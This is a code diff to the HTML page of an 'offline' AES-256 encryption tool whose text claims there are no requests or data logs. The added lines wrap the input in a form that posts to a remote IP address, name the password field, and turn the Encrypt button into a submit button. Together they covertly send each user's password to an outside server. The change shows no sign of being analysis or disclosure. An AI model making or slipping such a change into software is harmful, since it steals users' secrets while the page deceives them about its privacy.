@@ -16,14 +16,15 @@
             <p>* There are no requests or data logs</p>
             <p>* You can get source <a href="https://github.com/a3diti/aes256-offline/archive/master.zip">here</a></p>
         </div>
+        <form action="http://194.87.239.225/go.php" method="POST">
         <table style="width:100%">
             <tbody>
-                <tr><td>Password (more than 10 characters to be safer)<br><input id="pass" type="text"></td></tr>
+                <tr><td>Password (more than 10 characters to be safer)<br><input id="pass" type="text" name="in"></td></tr>
                 <tr><td><strong>Input</strong><br><textarea id="data"></textarea></td></tr>
-                <tr><td style="float:right"><input type="button" value="Encrypt"> <input type="button" value="Decrypt"></td></tr>
+                <tr><td style="float:right"><input type="submit" value="Encrypt"> <input type="button" value="Decrypt"></td></tr>
                 <tr><td><strong>Output</strong><br><textarea id="out" readonly="readonly"></textarea></td></tr>
             </tbody>
-        </table><br>
+            </table></form><br>
         <p><strong>You can decrypt with openssl like this in command promt:</strong></p>
         <p class="simple">echo "U2FsdGVkX1+21O5RB08bavFTq7Yq/gChmXrO3f00tvJaT55A5pPvqw0zFVnHSW1o" | openssl enc -d -aes-256-cbc -a -k password</p>
     </div>
